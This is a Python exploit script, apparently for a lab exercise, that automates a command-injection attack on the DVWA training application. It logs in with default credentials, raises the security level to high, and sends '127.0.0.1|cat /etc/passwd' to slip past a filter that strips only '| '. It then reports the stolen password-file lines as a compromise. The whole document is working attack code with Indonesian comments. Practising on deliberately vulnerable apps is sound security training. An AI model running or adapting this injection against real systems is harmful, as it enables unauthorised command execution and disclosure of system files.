def run_exploit(target_url):
    """
    Ouroboros Payload: DVWA Command Injection (HIGH Level Bypass)
    Targeting the flawed filter that removes '| ' but leaves '|' intact.
    """
    import requests
    import re
    import time
    
    session = requests.Session()
    
    # --- Helper: Extract Token ---
    def extract_token(html):
        m = re.search(r"name=['\"]user_token['\"].*?value=['\"]([a-f0-9]{32})['\"]", html, re.I)
        return m.group(1) if m else None
        
    try:
        # 1. Init DB
        r = session.get(f"{target_url}/setup.php", timeout=5)
        tok = extract_token(r.text)
        if tok: session.post(f"{target_url}/setup.php", data={"create_db": "Create / Reset Database", "user_token": tok})
        
        # 2. Login
        r2 = session.get(f"{target_url}/login.php")
        tok2 = extract_token(r2.text)
        r3 = session.post(f"{target_url}/login.php", data={"username": "admin", "password": "password", "Login": "Login", "user_token": tok2}, allow_redirects=True)
        if "logout" not in r3.text.lower():
            return {"status": "FAILED", "details": "Gagal login ke DVWA."}
            
        # 3. Set Security Level = HIGH
        r4 = session.get(f"{target_url}/security.php")
        tok3 = extract_token(r4.text)
        session.post(f"{target_url}/security.php", data={"security": "high", "seclev_submit": "Submit", "user_token": tok3})
        
        # 4. EXPLOIT: Command Injection bypass untuk level HIGH
        # Filter High level menghapus ';', '&', '| ', dsb.
        # TETAPI tidak menghapus '|' tanpa spasi!
        payload = "127.0.0.1|cat /etc/passwd"
        
        # Endpoint exec menggunakan POST di level High, membutuhkan user_token!
        r5 = session.get(f"{target_url}/vulnerabilities/exec/")
        tok4 = extract_token(r5.text)
        
        r6 = session.post(f"{target_url}/vulnerabilities/exec/", data={"ip": payload, "Submit": "Submit", "user_token": tok4})
        
        # Analisis Output
        if "root:x:0:0" in r6.text:
            # Ekstrak 3 baris pertama
            lines = [l for l in r6.text.split('\n') if ':' in l][:3]
            return {
                "status": "COMPROMISED",
                "details": "Command Injection Bypass (Level HIGH) berhasil menembus filter menggunakan operator pipe tanpa spasi '|cat'.",
                "extracted_data": lines
            }
        else:
            return {"status": "FAILED", "details": "Payload terblokir oleh filter WAF level HIGH."}
            
    except Exception as e:
        return {"status": "FAILED", "details": f"Error: {str(e)}"}
